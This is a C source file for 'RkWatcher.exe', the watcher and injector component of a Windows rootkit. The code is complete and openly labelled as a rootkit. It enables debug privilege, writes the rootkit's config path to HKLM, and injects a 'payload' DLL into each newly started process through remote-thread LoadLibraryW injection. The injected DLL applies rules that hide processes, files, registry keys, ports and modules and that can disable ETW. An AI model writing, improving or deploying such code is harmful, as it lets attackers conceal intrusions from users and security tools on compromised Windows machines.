/*
 * rk_config.c - Out-of-process configuration watcher / injector.
 *
 * Builds to RkWatcher.exe. This is the component that stays alive outside
 * any host process and does the two things an injected DLL cannot:
 *
 *   1. Publishes the active rk.ini path to HKLM\SOFTWARE\Rk\RkConfigPath so
 *      every injected copy (in any process, any user) reads the same rules.
 *   2. Watches process creation and injects RkDll.dll into new processes
 *      while [Advanced] HookInjector=1, so hiding rules apply to processes
 *      started after the rootkit was loaded.
 *
 * It also prints rule changes as they happen, which makes it usable as an
 * operator console for live tuning.
 *
 * Usage:
 *   RkWatcher.exe [--ini PATH] [--dll PATH] [--interval MS]
 *                 [--once] [--no-reg] [--sweep] [--quiet]
 *
 *   --once      load the config, print it, exit
 *   --sweep     also inject into processes that already exist at startup
 *   --no-reg    do not touch HKLM (use when the DLL sits next to rk.ini)
 *   --quiet     suppress per-process logging
 *
 * Requires Administrator for the registry publish and for cross-process
 * injection (SeDebugPrivilege is enabled automatically when available).
 */
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

#include "../common/config.h"

#define RK_PID_SLOTS        16384
#define RK_PID_PROBE_MAX    64
#define RK_DEFAULT_INTERVAL 2000
#define RK_INJECT_TIMEOUT   8000

static wchar_t g_ini[MAX_PATH * 2];
static wchar_t g_dll[MAX_PATH * 2];
static int     g_quiet    = 0;
static int     g_use_reg  = 1;
static int     g_sweep    = 0;
static DWORD   g_interval = RK_DEFAULT_INTERVAL;

/* ================================================================== */
/* Bounded PID set (open addressing, fixed allocation)                 */
/* ================================================================== */

static DWORD g_seen[RK_PID_SLOTS];
static DWORD g_now[RK_PID_SLOTS];
static int   g_baseline_pending = 1;    /* g_seen is empty: first scan */

static DWORD pid_slot(DWORD pid)
{
    return ((pid * 2654435761u) >> 3) % RK_PID_SLOTS;
}

/* Inserts pid. Returns 1 when the pid was newly added, 0 if present. */
static int set_add(DWORD *tbl, DWORD pid)
{
    DWORD i = pid_slot(pid);
    int   n;

    for (n = 0; n < RK_PID_PROBE_MAX; ++n)
    {
        DWORD s = (i + (DWORD)n) % RK_PID_SLOTS;

        if (tbl[s] == pid)
            return 0;
        if (tbl[s] == 0)
        {
            tbl[s] = pid;
            return 1;
        }
    }
    return 0;   /* saturated: treat as known rather than injecting twice */
}

static int set_has(const DWORD *tbl, DWORD pid)
{
    DWORD i = pid_slot(pid);
    int   n;

    for (n = 0; n < RK_PID_PROBE_MAX; ++n)
    {
        DWORD s = (i + (DWORD)n) % RK_PID_SLOTS;

        if (tbl[s] == pid)
            return 1;
        if (tbl[s] == 0)
            return 0;
    }
    return 0;
}

/* ================================================================== */
/* Paths                                                               */
/* ================================================================== */

static void own_directory(wchar_t *out, int out_cch)
{
    wchar_t  path[MAX_PATH * 2];
    wchar_t *slash;

    path[0] = 0;
    GetModuleFileNameW(NULL, path, MAX_PATH * 2 - 1);

    slash = wcsrchr(path, L'\\');
    if (slash)
        slash[1] = 0;

    wcsncpy(out, path, (size_t)out_cch - 1);
    out[out_cch - 1] = 0;
}

static void default_paths(void)
{
    own_directory(g_ini, MAX_PATH * 2);
    wcscat(g_ini, L"rk.ini");

    own_directory(g_dll, MAX_PATH * 2);
    wcscat(g_dll, L"RkDll.dll");
}

/* ================================================================== */
/* Privilege                                                           */
/* ================================================================== */

static void enable_debug_privilege(void)
{
    HANDLE           token = NULL;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    /* SE_DEBUG_NAME is TEXT()-based; the neutral LookupPrivilegeValue
     * pairs with it under any UNICODE setting (mingw and MSVC alike). */
    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
        AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);

    CloseHandle(token);
}

/* ================================================================== */
/* Registry publish                                                    */
/* ================================================================== */

static void publish_ini_path(void)
{
    HKEY  key  = NULL;
    DWORD disp = 0;

    if (!g_use_reg)
        return;

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Rk", 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL,
                        &key, &disp) != ERROR_SUCCESS)
    {
        wprintf(L"[rk] HKLM publish failed (not elevated?); injected copies "
                L"will look next to the DLL instead\n");
        return;
    }

    RegSetValueExW(key, L"RkConfigPath", 0, REG_SZ, (const BYTE *)g_ini,
                   (DWORD)((wcslen(g_ini) + 1) * sizeof(wchar_t)));
    RegCloseKey(key);

    if (!g_quiet)
        wprintf(L"[rk] published config path: %s\n", g_ini);
}

/* ================================================================== */
/* Injection                                                           */
/* ================================================================== */

static int inject_pid(DWORD pid, const wchar_t *dll)
{
    HANDLE   proc, thread;
    void    *mem;
    SIZE_T   bytes;
    HMODULE  k32;
    void    *load_lib;
    DWORD    wait;
    int      ok = 0;

    if (pid == 0 || pid == 4 || pid == GetCurrentProcessId())
        return 0;

    proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                       PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                       FALSE, pid);
    if (!proc)
        return 0;

    bytes = (wcslen(dll) + 1) * sizeof(wchar_t);
    mem = VirtualAllocEx(proc, NULL, bytes, MEM_COMMIT | MEM_RESERVE,
                         PAGE_READWRITE);
    if (!mem)
    {
        CloseHandle(proc);
        return 0;
    }

    k32      = GetModuleHandleW(L"kernel32.dll");
    load_lib = k32 ? (void *)GetProcAddress(k32, "LoadLibraryW") : NULL;

    if (load_lib && WriteProcessMemory(proc, mem, dll, bytes, NULL))
    {
        thread = CreateRemoteThread(proc, NULL, 0,
                                    (LPTHREAD_START_ROUTINE)load_lib, mem,
                                    0, NULL);
        if (thread)
        {
            /* A 32-bit target fails here with a clean nonzero exit code;
             * we simply report "not injected" for it. */
            wait = WaitForSingleObject(thread, RK_INJECT_TIMEOUT);
            if (wait == WAIT_OBJECT_0)
            {
                DWORD code = 0;
                if (GetExitCodeThread(thread, &code) && code != 0)
                    ok = 1;     /* nonzero = remote module base */
            }
            CloseHandle(thread);
        }
    }

    /* The remote string is left allocated on purpose: LoadLibraryW has
     * already consumed it, and racing a free against a thread we just
     * signalled buys nothing but risk. */
    CloseHandle(proc);
    return ok;
}

/*
 * Inject into processes that appeared since the previous scan. The first
 * scan only builds a baseline unless --sweep was requested, so starting
 * the watcher does not immediately touch every process on the box.
 */
static int inject_new_processes(rk_config *cfg)
{
    HANDLE          snap;
    PROCESSENTRY32W pe;
    int             injected = 0;
    int             want     = cfg->hook_injector || g_sweep;

    memset(g_now, 0, sizeof(g_now));

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe))
    {
        do
        {
            DWORD pid = pe.th32ProcessID;

            if (!set_add(g_now, pid))
                continue;

            if (g_baseline_pending && !g_sweep)
                continue;                       /* baseline pass */
            if (!g_baseline_pending && set_has(g_seen, pid))
                continue;                       /* already handled */
            if (!want)
                continue;

            if (!g_quiet)
                wprintf(L"[rk] injecting into %5lu  %s\n", pid,
                        pe.szExeFile);

            if (inject_pid(pid, g_dll))
                ++injected;

        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);

    memcpy(g_seen, g_now, sizeof(g_seen));
    g_baseline_pending = 0;

    return injected;
}

/* ================================================================== */
/* Config reporting                                                    */
/* ================================================================== */

static void print_config(const rk_config *cfg)
{
    int i;

    wprintf(L"[rk] rules: %d process, %d file, %d registry, %d port, "
            L"%d module | self_hide=%d etw=%d inject=%d\n",
            cfg->process_count, cfg->file_count, cfg->registry_count,
            cfg->port_count, cfg->module_count,
            cfg->self_hide, cfg->disable_etw, cfg->hook_injector);

    if (g_quiet)
        return;

    for (i = 0; i < cfg->process_count; ++i)
        wprintf(L"        process  %s\n", cfg->processes[i]);
    for (i = 0; i < cfg->file_count; ++i)
        wprintf(L"        file     %s\n", cfg->files[i]);
    for (i = 0; i < cfg->registry_count; ++i)
        wprintf(L"        registry %s\n", cfg->registry[i]);
    for (i = 0; i < cfg->port_count; ++i)
        wprintf(L"        port     %u\n", (unsigned)cfg->ports[i]);
    for (i = 0; i < cfg->module_count; ++i)
        wprintf(L"        module   %s\n", cfg->modules[i]);
}

/* ================================================================== */
/* Command line                                                        */
/* ================================================================== */

static void usage(void)
{
    wprintf(L"RkWatcher - configuration watcher and process injector\n"
            L"  --ini PATH       config file   (default: rk.ini next to this exe)\n"
            L"  --dll PATH       payload DLL   (default: RkDll.dll next to this exe)\n"
            L"  --interval MS    poll interval (default: %lu)\n"
            L"  --once           load and print the config, then exit\n"
            L"  --sweep          inject into existing processes at startup\n"
            L"  --no-reg         do not publish HKLM\\SOFTWARE\\Rk\\RkConfigPath\n"
            L"  --quiet          suppress per-process logging\n",
            (unsigned long)RK_DEFAULT_INTERVAL);
}

static int parse_args(int argc, wchar_t **argv)
{
    int i;

    for (i = 1; i < argc; ++i)
    {
        if (!_wcsicmp(argv[i], L"--help"))
        {
            usage();
            return -1;
        }
        else if (!_wcsicmp(argv[i], L"--once"))
            g_interval = 0;
        else if (!_wcsicmp(argv[i], L"--quiet"))
            g_quiet = 1;
        else if (!_wcsicmp(argv[i], L"--no-reg"))
            g_use_reg = 0;
        else if (!_wcsicmp(argv[i], L"--sweep"))
            g_sweep = 1;
        else if (!_wcsicmp(argv[i], L"--ini") && i + 1 < argc)
            wcsncpy(g_ini, argv[++i], MAX_PATH * 2 - 1);
        else if (!_wcsicmp(argv[i], L"--dll") && i + 1 < argc)
            wcsncpy(g_dll, argv[++i], MAX_PATH * 2 - 1);
        else if (!_wcsicmp(argv[i], L"--interval") && i + 1 < argc)
            g_interval = (DWORD)_wtoi(argv[++i]);
    }
    return 0;
}

/* main() + CommandLineToArgvW instead of wmain() keeps the file buildable
 * with both MSVC and mingw-w64 without -municode. */
int main(void)
{
    rk_config  cfg;
    int        argc = 0;
    wchar_t  **argv;

    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv)
        return 1;

    default_paths();

    if (parse_args(argc, argv) != 0)
    {
        LocalFree(argv);
        return 0;
    }
    LocalFree(argv);

    if (g_interval == 0)
    {
        if (rk_config_load(&cfg) != 0)
        {
            wprintf(L"[rk] could not read %s\n", g_ini);
            return 1;
        }
        print_config(&cfg);
        return 0;
    }

    enable_debug_privilege();
    publish_ini_path();

    wprintf(L"[rk] watching %s (interval %lu ms)\n",
            g_ini, (unsigned long)g_interval);

    /* Prime the snapshot so the first scan only builds a baseline. */
    if (rk_config_load(&cfg) == 0)
        print_config(&cfg);
    else
        memset(&cfg, 0, sizeof(cfg));

    for (;;)
    {
        if (rk_config_changed() && rk_config_load(&cfg) == 0)
        {
            wprintf(L"[rk] configuration reloaded\n");
            print_config(&cfg);
        }

        inject_new_processes(&cfg);
        Sleep(g_interval);
    }
}